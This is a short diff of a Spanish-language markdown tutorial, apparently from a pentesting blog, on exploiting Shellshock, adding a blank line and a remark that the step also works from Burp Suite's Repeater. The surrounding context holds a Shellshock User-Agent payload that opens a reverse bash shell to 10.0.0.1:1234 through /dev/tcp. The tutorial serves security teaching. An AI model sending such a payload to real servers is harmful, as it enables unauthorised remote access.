@@ -171,6 +171,7 @@ Y cambiaremos el ```User-Agent``` que se encuentra marcado con el cuadro rojo, p
 ```bash
 User Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
 ```
+
 Procedemos a reemplazar y adaptar el ```User-Agent```:
 
 [![shellshockbs](/images/shellshockbs.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/refs/heads/master/images/shellshockbs.png)
@@ -191,6 +192,9 @@ bash-4.3$
 ```
 
 Y recibimos respuesta en el puerto que teníamos a la escucha anteriormente.
+
+> El proceso también se puede realizar desde la herramienta ```repeater``` de burpsuite.
+
 
 ### Explotación por CURL
 
